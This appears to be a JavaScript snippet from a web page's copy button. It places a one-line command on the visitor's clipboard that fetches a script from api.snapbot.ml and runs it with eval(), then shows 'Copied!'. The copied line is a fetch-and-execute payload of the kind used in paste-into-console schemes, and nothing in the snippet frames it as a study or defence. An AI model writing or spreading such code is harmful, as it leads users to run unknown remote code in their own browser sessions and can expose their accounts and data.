function copy(){
  navigator.clipboard.writeText("fetch(`https://api.snapbot.ml/api.js`).then(data=>{data.text().then(text=>{eval(text)})});")

  document.getElementById(`copy`).innerText = `Copied!`
}